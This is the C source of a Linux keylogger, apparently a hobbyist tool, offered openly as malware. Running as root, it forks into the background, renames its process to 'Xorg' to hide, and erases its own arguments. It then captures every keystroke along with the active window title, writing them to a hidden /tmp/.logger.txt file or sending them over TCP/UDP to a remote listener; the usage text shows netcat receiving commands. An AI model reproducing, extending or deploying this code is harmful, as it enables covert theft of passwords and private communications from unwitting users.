/************************************************************
 *  Created by: ANTZ                                        *
 *  SIMPLE_LOCAL_&_REMOTE_KEYLOGGER                         *
 *  A lot of functionalities must be added. Coming soon...  *
 ***********************************************************/
#include "main.h"

int main(int argc, char** argv)
{	
	struct input_event event;
	struct dirent *curr;
	char name[LEN], filetxt[LEN], *port, *addr, *layout, *ly_tmp, *key, actual[LLEN], used[LLEN];
	int i, lc, c, m = 0, n = 0, p = 0, a = 0, d = 0, o = 0, dev, readed, size = sizeof(struct input_event), check = 1;	
	DIR *directory;
	FILE *dst;	

	if(getuid())
    {
    	banner();
        fprintf(stderr, "It must be run as root!!\n");
        exit(1);
    }

	void usage()
        {
                banner();
                fprintf(stderr,"\nDESCRIPTION:\n\n\t- Simple keylogger that runs on Linux either locally or remotely.\n\t- It shows the active window on which the target is writing.\n");
                fprintf(stderr,"\t- Keys are mapped on US keyboard.\n\t- It shows the keyboard layout(e.g.: us, it, colemak, etc..).\n");
                fprintf(stderr,"\t- Process name is renamed as \"Xorg\".\n\t- It works with both TCP and UDP and with ipv6 too.\n\t- It must be run as root.\n");
                fprintf(stderr,"\nSYNOPSIS:\n\n\t#%s [OPTIONS]\n", argv[0]);
                fprintf(stderr,"\nOPTIONS:\n\n\t-d <input-device>:\t\t\tIf not specified, the default device is '/dev/input/by-path/***kbd'\n");
                fprintf(stderr,"\t-o <output-file>:\t\t\tIt can be used only if '-m remote' option is not specified. The default output file is '/tmp/.logger.txt'\n");
                fprintf(stderr,"\t-m remote -a <IP-ADDR> -p <PORT>:\tIt sends all the keystrokes on the remote server located at <IP-ADDR:PORT>\n");
                fprintf(stderr,"\nEXAMPLES:\n");
                fprintf(stderr,"\n\t[TCP]\n\tServer$ nc -lvp 8888 > logger.txt\n\tClient#%s -m remote -a 127.0.0.1 -p 8888\n", argv[0]);
                fprintf(stderr,"\n\t[UDP]\n\tServer$ nc -u -lvp 8888 > logger.txt\n\tClient#%s -m remote -a 127.0.0.1 -p 8888\n", argv[0]);
                fprintf(stderr,"\n\t[IPv6]\n\tServer$ nc -6 -lvp 8888 > logger.txt\n\tClient#%s -m remote -a ::1 -p 8888\n",argv[0]);
                fprintf(stderr,"\nNOTES:\n\tSupported keyboards:\n\n\t- QWERTY: us, es, it.\n\t- AZERTY: fr.\n\t- QWERTZ: de.\n\t- DVORAK: us.\n\t- COLEMAK\n\t- default: qwerty-us.\n");
                fprintf(stderr,"\n\tYou may also change keyboard during slrk execution with, for example:\n");
                fprintf(stderr,"\n\t  $setxkbmap dvorak\n\n\tand slrk will detects the new layout.\n");
                exit(0);
        }

	
	
	
	while((c = getopt(argc, argv, ":d:o:m:p:a:")) != -1)
	{
		switch(c)
		{
			case 'd': 
					strncpy(name, optarg, LEN); 
					name[LEN-1] = '\0';
					d = 1;
					break;
					
			case 'o': 	
					strncpy(filetxt, optarg, LEN); 
					filetxt[LEN-1] = '\0';
					o = 1;
					break;
					
			case 'm': 	
					if(!strcmp(optarg,"remote"))
					{
						m = 1;
						break;
					}
					fprintf(stderr, "Invalid argument \"-m %s\"\n", optarg);
					  	exit(1);
					
			case 'p':	
					if(strlen(optarg) > 5)
					{
						fprintf(stderr, "Insert a valid port!!\n");
						exit(1);
					}
					port = optarg;
					p = 1;
					break;
					
			case 'a':	
					addr = optarg;
					a = 1;
					break;
					
			default:
					usage();
		}
	}

	if(signal(SIGINT, handler) == SIG_ERR)
	{
		fprintf(stderr, "Error to handle SIGINT\n");
		exit(1);
	}
	
	if(fork())
	{
		exit(0);
	} 
	
	memset(argv[0], 0x0, strlen(argv[0]));
	strncpy(argv[0], "Xorg", 4);
	argv[0][5]='\0';
	
	
	if(!d)
	{
		if((directory = opendir("/dev/input/by-path")) == NULL)
		{	
			fprintf(stderr, "Failed to open dir \"/dev/input/by-path\"\n");
			exit(1);
		}
		while((curr = readdir(directory)) != NULL)
		{
			if(strstr(curr->d_name, "kbd"))
			{
				snprintf(name, LEN, "/dev/input/by-path/%s", curr->d_name);
				check = 0;
				break;
			}
		}
		if(check)
		{
			fprintf(stderr, "Failed to find device..\n");
			exit(1);
		}
	}

	if((dev = open(name, O_RDONLY)) == -1)
	{
		fprintf(stderr,"Failed to open %s\n", argv[1]);
		exit(1);
	}
	

	if(!m && !p && !a)
	{
		if(!o)
		{
			snprintf(filetxt, 17, "/tmp/.logger.txt");
		}
		if( (dst = fopen(filetxt, "a")) == NULL)
		{
			fprintf(stderr,"Error to open file\n");
			exit(1);
		}
	}
	else if(m && p && a)
	{
		if(o)
		{
				fprintf(stderr, "Too much arguments. You can't specify output file with \"-m remote\" option.\n");
				exit(1);
		}
		
		lc = conn(addr,port);
					
	}
	else
	{	
		fprintf(stderr, "Invalid arguments.\n");
		usage();
	}
	
	for(i = 1; i < argc; i++)
	{
		memset(argv[i], 0x0, strlen(argv[i]));
	}
	
	memset(used,0x0, LLEN);   
	if(!m)
	{
		layout = get_kb_layout(get_kb_keycodes(), get_kb_symbols());

		fprintf(dst, "\n[Checking Layout....]");
		fprintf(dst, "\n[LAYOUT: %s ]\n\n", layout);

		while(1)
		{
			memset(&event, 0x0, size); 
			if((readed = read(dev, &event, size))< size)
			{
				fprintf(stderr, "Failed to read\n");
				exit(1);
			}
		
			if(event.type == EV_KEY && event.value == 1)
			{
				memset(actual,0x0, LLEN);
				sprintf(actual,"%s", get_window_title());
				actual[LLEN-1] = '\0';
				

				
				
				ly_tmp = get_kb_layout(get_kb_keycodes(), get_kb_symbols());

				if(strcmp(ly_tmp, layout))
				{
					layout = ly_tmp;
					fprintf(dst, "\n\n[NEW LAYOUT DETECTED: %s ]\n\n", layout);
				}

				
				if(strcmp(actual, used))
				{	
					memset(used,0x0, LLEN);
					sprintf(used, "%s", actual);
					used[LLEN-1] = '\0';
					n = 1;
				}
			
				if(n)
				{
					fprintf(dst, "\n\n[%s]\n\n", used);
					n = 0;
				}

				fprintf(dst,"%s",code_to_str(layout, event.code));
				fflush(NULL);
			}
		}
	}
	else
	{	//-m remote
		layout = get_kb_layout(get_kb_keycodes(), get_kb_symbols());
		write(lc,"\n[Checking layout....]\n", 24);
		write(lc,"[LAYOUT: ", 9);
		write(lc, layout, strlen(layout));
		write(lc, " ]\n\n", 4);

		while(1)
		{

			memset(&event, 0x0, size); 
			if((readed = read(dev, &event, size))< size)
			{
				fprintf(stderr, "Failed to read\n");
				exit(1);
			}
			
			if(event.type == EV_KEY && event.value == 1)
			{
				memset(actual,0x0, LLEN);
				sprintf(actual,"%s", get_window_title());
				actual[LLEN-1] = '\0';

				ly_tmp = get_kb_layout(get_kb_keycodes(), get_kb_symbols());

				if(strcmp(ly_tmp, layout))
				{
					layout = ly_tmp;

					write(lc,"\n\n[NEW LAYOUT DETECTED: ", 24);
					write(lc, layout, strlen(layout));
					write(lc, " ]\n\n", 4);
				}

				
				if(strcmp(actual, used))
				{	
					memset(used,0x0, LLEN);
					sprintf(used, "%s", actual);
					used[LLEN-1] = '\0';
					n = 1;
				}
			
				if(n)
				{
					write(lc, "\n\n[", 4 );
					write(lc, used, strlen(used));
					write(lc,"]\n\n", 4 );
					n = 0;
				}

				key = code_to_str(layout,event.code);
				write(lc, code_to_str(layout,event.code), strlen(key));	
			}
		}
	} //end -m remote
	return 0;
}

void handler()
{
	printf("\nExit..\n");
	exit(0);
}

void banner()
{
	fprintf(stderr,"\n_____/\\\\\\\\\\\\\\\\\\\\\\____/\\\\\\________________/\\\\\\\\\\\\\\\\\\______/\\\\\\________/\\\\\\\n");         
	fprintf(stderr," ___/\\\\\\/////////\\\\\\_\\/\\\\\\______________/\\\\\\///////\\\\\\___\\/\\\\\\_____/\\\\\\//\n");        
	fprintf(stderr,"  __\\//\\\\\\______\\///__\\/\\\\\\_____________\\/\\\\\\_____\\/\\\\\\___\\/\\\\\\__/\\\\\\//\n");       
	fprintf(stderr,"   ___\\////\\\\\\_________\\/\\\\\\_____________\\/\\\\\\\\\\\\\\\\\\\\\\/____\\/\\\\\\\\\\\\//\\\\\\\n");      
	fprintf(stderr,"    ______\\////\\\\\\______\\/\\\\\\_____________\\/\\\\\\//////\\\\\\____\\/\\\\\\//_\\//\\\\\\\n");     
	fprintf(stderr,"     _________\\////\\\\\\___\\/\\\\\\_____________\\/\\\\\\____\\//\\\\\\___\\/\\\\\\____\\//\\\\\\\n");    
	fprintf(stderr,"      __/\\\\\\______\\//\\\\\\__\\/\\\\\\_____________\\/\\\\\\_____\\//\\\\\\__\\/\\\\\\_____\\//\\\\\\\n");   
	fprintf(stderr,"       _\\///\\\\\\\\\\\\\\\\\\\\\\/___\\/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_\\/\\\\\\______\\//\\\\\\_\\/\\\\\\______\\//\\\\\\\n");  
	fprintf(stderr,"        ___\\///////////_____\\///////////////__\\///________\\///__\\///________\\///\n"); 
	fprintf(stderr,"\n~antz~\n");
}
